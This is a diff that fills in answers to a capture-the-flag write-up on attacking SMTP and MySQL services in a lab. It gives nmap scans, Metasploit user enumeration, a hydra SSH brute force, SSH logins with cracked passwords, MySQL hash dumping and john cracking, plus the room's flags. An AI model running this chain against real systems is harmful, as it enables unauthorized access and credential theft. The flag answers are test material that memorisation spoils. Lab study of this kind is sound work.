@@ -160,37 +160,41 @@ ls -la bash
 
 ## Task 5
 
+https://computer.howstuffworks.com/e-mail-messaging/email3.htm
+
+https://www.afternerd.com/blog/smtp/
+
 ### Task 5.1
 
-> 
+> Simple Mail Transfer Protocol
 
 ### Task 5.2
 
-> 
+> emails
 
 ### Task 5.3
 
-> 
+> SMTP handshake
 
 ### Task 5.4
 
-> 
+> 25
 
 ### Task 5.5
 
-> 
+> SMTP queue
 
 ### Task 5.6
 
-> 
+> POP/IMAP
 
 ### Task 5.7
 
-> 
+> Y
 
 ### Task 5.8
 
-> 
+> Y
 
 <br>
 
@@ -198,47 +202,90 @@ ls -la bash
 
 ### Task 6.1
 
-> 
+```shell
+nmap -A -oN nmap/initial2 -p- 10.10.237.102
+```
+
+> 25
 
 ### Task 6.2
 
-> 
+> msfconsole
 
 ### Task 6.3
 
-> 
+```shell
+msfconsole
+	search smtp_version
+```
+
+> auxiliary/scanner/smtp/smtp_version
 
 ### Task 6.4
 
-> 
+```shell
+	use 0
+		show options
+```
+
+> options
 
 ### Task 6.5
 
-> 
+> RHOSTS
 
 ### Task 6.6
 
-> 
+```shell
+		set RHOSTS 10.10.237.102
+		run
+```
+
+> polosmtp.home
 
 ### Task 6.7
 
-> 
+🧰 https://mailtrap.io/blog/mail-transfer-agent/
+
+> Postfix
 
 ### Task 6.8
 
-> 
+```shell
+		search smtp_enum
+```
+
+> auxiliary/scanner/smtp/smtp_enum
 
 ### Task 6.9
 
-> 
+```shell
+	use 0
+		show options
+		set USER_FILE ../../Tools/SecLists/Usernames/top-usernames-shortlist.txt
+```
+
+> USER_FILE
 
 ### Task 6.10
 
-> 
+```shell
+		set RHOSTS 10.10.237.102
+```
+
+> RHOSTS
 
 ### Task 6.12
 
-> 
+```shell
+		run
+```
+
+> administrator
+
+```shell
+		exit
+```
 
 <br>
 
@@ -246,55 +293,103 @@ ls -la bash
 
 ### Task 7.1
 
-> 
+```shell
+hydra -t 10 -l administrator -P ../../Tools/KaliWordlists/rockyou.txt -vV 10.10.237.102 ssh
+```
+
+> alejandro
 
 ### Task 7.2
 
-> 
+```shell
+ssh administrator@10.10.237.102
+	yes
+	alejandro
+	
+	ls
+	cat smtp.txt
+```
+
+> THM{who_knew_email_servers_were_c00l?}
 
 <br>
 
 ## Task 8
 
+https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html 
+
+https://www.w3schools.com/php/php_mysql_intro.asp
+
 ### Task 8.1
 
-> 
+> relational database management system
 
 ### Task 8.2
 
-> 
+> SQL
 
 ### Task 8.3
 
-> 
+> client-server
 
 ### Task 8.4
 
-> 
+> back end database
 
 ### Task 8.5
 
-> 
+> Facebook
 
 <br>
 
 ## Task 9
 
+https://nmap.org/nsedoc/scripts/mysql-enum.html
+
+https://www.exploit-db.com/exploits/23081
+
 ### Task 9.1
 
-> 
+```shell
+nmap -A -oN nmap/initial3 -p- 10.10.15.100
+```
+
+> 3306
 
 ### Task 9.4
 
-> 
+```shell
+mysql -h 10.10.15.100 -u root -p
+	password
+
+	exit
+msfconsole
+	search mysql_sql
+	use 0
+		show options
+```
+
+> PASSWORD/RHOSTS/USERNAME
 
 ### Task 9.5
 
-> 
+```shell
+		set PASSWORD password
+		set RHOSTS 10.10.15.100
+		set USERNAME root
+		run
+```
+
+> 5.7.29-0ubuntu0.18.04.1
 
 ### Task 9.6
 
-> 
+```shell
+		set SQL show databases
+		run
+```
+
+> 4
 
 <br>
 
@@ -302,33 +397,80 @@ ls -la bash
 
 ### Task 10.1
 
-> 
+```shell
+		search mysql_schemadump
+	use 0
+```
+
+> auxiliary/scanner/mysql/mysql_schemadump
 
 ### Task 10.2
 
-> 
+```shell
+		show options
+		set PASSWORD password
+		set RHOSTS 10.10.15.100
+		set USERNAME root
+		run
+```
+
+> waits_global_by_latency
 
 ### Task 10.3
 
-> 
+```shell
+		search mysql_hashdump
+	use 0
+```
+
+> auxiliary/scanner/mysql/mysql_hashdump
 
 ### Task 10.4
 
-> 
+```shell
+		show options
+		set PASSWORD password
+		set RHOSTS 10.10.15.100
+		set USERNAME root
+		run
+```
+
+> carl
+
+```shell
+echo "carl:*EA031893AA21444B170FC2162A56978B8CEECE18" > hash.txt
+```
 
 ### Task 10.5
 
-> 
+> carl:*EA031893AA21444B170FC2162A56978B8CEECE18
 
 ### Task 10.6
 
-> 
+```shell
+john hash.txt
+```
+
+> doggie
 
 ### Task 10.7
 
-> 
+```shell
+ssh carl@10.10.15.100
+	yes
+	doggie
+	
+	ls
+	cat MySQL.txt
+```
 
+> THM{congratulations_you_got_the_mySQL_flag}
 
+<br>
+
+https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html
+
+https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
 
 
 
